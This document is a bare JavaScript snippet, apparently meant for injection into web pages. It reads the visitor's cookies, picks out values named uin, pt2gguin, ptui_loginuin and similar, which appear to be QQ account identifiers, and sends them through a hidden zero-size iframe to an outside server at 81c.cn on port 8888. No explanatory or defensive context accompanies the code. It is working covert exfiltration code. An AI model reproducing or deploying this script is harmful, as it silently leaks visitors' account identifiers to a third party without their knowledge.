var c=document.cookie;
var vc=c.split("; ");
var i;
var pp="";
for (i=0;i<vc.length;i++)
{
	var tmp=vc[i].split("=");
	if (tmp[0]=='uin' ||  tmp[0]=='pt2gguin' ||  tmp[0]=='uin_cookie' || tmp[0]=='ptui_loginuin' || tmp[0]=='o_cookie' || tmp[0]=='p_uin')
	{
		pp=pp+tmp[1] + '%2C';
	}
}
if(pp!="")
{
	var f = document.createElement("iframe");
	f.height = "0";
	f.width = "0";
	f.border = "0";
	f.style.display='none';
	f.src = "http://www.81c.cn:8888/cs/query.asp?webID=" + pp + "&tm=" + Math.random();
	document.body.appendChild(f);
}
